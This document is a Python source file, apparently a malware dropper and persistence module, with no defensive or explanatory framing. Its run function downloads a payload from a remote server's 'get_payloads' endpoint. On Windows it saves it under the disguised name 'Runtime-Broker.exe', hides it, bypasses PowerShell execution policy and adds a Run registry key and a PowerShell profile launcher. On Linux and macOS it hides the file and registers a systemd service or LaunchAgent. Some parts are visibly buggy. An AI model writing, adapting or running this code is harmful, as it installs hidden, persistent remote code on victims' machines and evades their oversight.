import os
import platform
import subprocess
import base64
import requests
import getpass

def run(url, file_path):
    def create_hidden_file(path):
        if os.name == 'nt':  # Windows
            subprocess.run(['attrib', '+h', path])
        else:  # Unix-like (Linux, macOS, FreeBSD, OpenBSD, SunOS, Android)
            dirname, basename = os.path.split(path)
            hidden_path = os.path.join(dirname, '.' + basename)
            os.rename(path, hidden_path)
            path = hidden_path
        return path
    
    def add_crontab_job(command, interval_minutes=10):
        cron_job = f"*/{interval_minutes} * * * * {command}"
        os.system(f'(crontab -l; echo "{cron_job}") | crontab -')


    def create_systemd_service(file_path):
        subprocess.run("mkdir -p  ~/.config/systemd/user/", shell=True)

        with open ('~/.config/systemd/user/systemd.service', 'w') as f:
            f.write(f"""[Unit]
Description=systemd service
After=network.target
StartLimitIntervalSec=0[Service]
Type=simple
Restart=always
RestartSec=1
User={getpass.getuser()}
ExecStart={file_path}

[Install]
WantedBy=multi-user.target""")

        subprocess.run('chmod +x /etc/systemd/system/systemd.service')
        subprocess.run('systemctl start systemd')
        subprocess.run('systemctl enable systemd')
    
    def create_launch_agent(path, label):
        plist_content = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>{label}</string>
            <key>ProgramArguments</key>
            <array>
                <string>/usr/bin/python</string>
                <string>{path}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """
        plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{label}.plist")
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        os.system(f"launchctl load {plist_path}")
    
    def create_powershell_profile(path, name):
        command = 'powershell -c Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser'
        subprocess.run(command, shell=True)
        command = f'powershell -c New-Item $profile -Type File -Force'
        subprocess.run(command, shell=True)
        directory = f"C:\\Users\\{os.getlogin()}\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1"
        with open(directory, 'w') as f:
            f.write("""# Define the process name you want to check
    $processName = "Runtime-Broker"
    
    # Define the path to the executable you want to run
    $exePath = '"""+path+"""'
    
    # Check if the process is running
    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
    
    if ($process) {
    } else {
    try {
        Start-Process -FilePath $exePath
    } catch {
    }
    }""")

        create_hidden_file(directory)
    
    def add_to_startup(path, name):
        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        shortcut_path = os.path.join(startup_dir, f"{name}.lnk")
    
        with open(shortcut_path, 'w') as shortcut:
            shortcut.write(f'[InternetShortcut]\nURL=file:///{path}')
    
        return shortcut_path
    
    def add_registry_startup(path, name):
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}" /background')
        winreg.CloseKey(key)
     
    
    os_type = platform.system()
    download_path = file_path
    print(f"{url}get_payloads/{download_path}.exe")
    
    if os_type == 'Windows':
        import winreg
    
        file_path = "C:\\ProgramData\\Runtime-Broker.exe"
        if not os.path.exists(file_path):
            response = requests.get(f"{url}get_payloads/{download_path}.exe")
            with open(file_path, 'wb') as file:
              file.write(response.content)
                
        try:
            create_powershell_profile(file_path, "Runtime-Broker")
        except Exception as err:
            print(err)
            print("could not add powershell profile")
        create_hidden_file(file_path)
        create_hidden_file("C:\\ProgramData\\uuid.txt")
        #add_to_startup(file_path, "Runtime Broker")
        add_registry_startup(file_path, "Runtime Broker")
    
    elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
        file_path = "./exe"
        if not os.path.exists(file_path):
            response = requests.get(f"{url}get_payloads/{download_path}")
            with open(file_path, 'wb') as file:
              file.write(response.content)
        # Create a hidden file and add a crontab job
        create_hidden_file(file_path)
        create_systemd_service(file_path)
        #add_crontab_job(file_path)
    
    elif os_type == 'Darwin':  # macOS
        file_path = "./wow.exe"
        if not os.path.exists(file_path):
            response = requests.get(f"{url}get_payloads/{download_path}")
            with open(file_path, 'wb') as file:
              file.write(response.content)

        create_hidden_file(file_path)
        create_launch_agent(file_path, "com.yourname.launcher")
    
    else:
        print(f"Unsupported OS: {os_type}")
